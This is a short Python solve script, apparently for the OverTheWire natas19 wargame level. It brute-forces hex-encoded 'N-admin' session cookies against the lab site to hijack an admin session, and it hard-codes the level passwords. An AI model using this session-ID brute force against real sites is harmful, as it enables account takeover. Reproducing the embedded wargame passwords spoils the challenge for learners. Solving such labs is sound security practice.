#! /usr/bin/env python3
import requests
import binascii

baseUrl = 'http://natas19.natas.labs.overthewire.org/index.php'
print(binascii.hexlify(str.encode('498-adsf')).decode())
#print((requests.get(baseUrl, auth=('natas18', 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP'), cookies={'PHPSESSID':str(119)})).text)
for i in range(281, 640):


    print('Current i='+str(i),binascii.hexlify(str.encode(str(i)+'-admin')).decode())

    r = requests.get(baseUrl, auth=('natas19', '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs'), cookies={'PHPSESSID':binascii.hexlify(str.encode(str(i)+'-admin')).decode()})#binascii.hexlify(str.encode(str(i)+'-admin')).decode()
    if 'You are an admin' in r.text:
        print('admin found for i='+str(i),binascii.hexlify(str.encode(str(i)+'-admin')).decode())
        print(r.text)
        break